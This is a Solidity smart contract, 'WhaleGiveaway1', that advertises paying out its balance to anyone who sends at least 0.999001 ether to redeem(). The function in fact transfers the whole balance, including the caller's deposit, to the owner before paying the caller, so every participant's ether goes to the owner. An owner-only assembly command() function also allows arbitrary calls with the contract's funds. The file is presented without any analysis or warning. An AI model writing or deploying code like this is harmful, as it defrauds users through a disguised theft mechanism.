pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner;

    uint public constant minEligibility = 0.999001 ether;

    function WhaleGiveaway1() public {
        owner = msg.sender;
    }

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);

        bool success;
        bytes4 sig = bytes4(keccak256("command(address,bytes)"));
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, sig)
            mstore(add(ptr, 0x04), adr)
            mstore(add(ptr, 0x24), data)
            success := call(
                gas, 
                adr, 
                msg.value, 
                ptr, 
                0x44, 
                ptr, 
                0x0
            )
        }
        require(success);
    }
}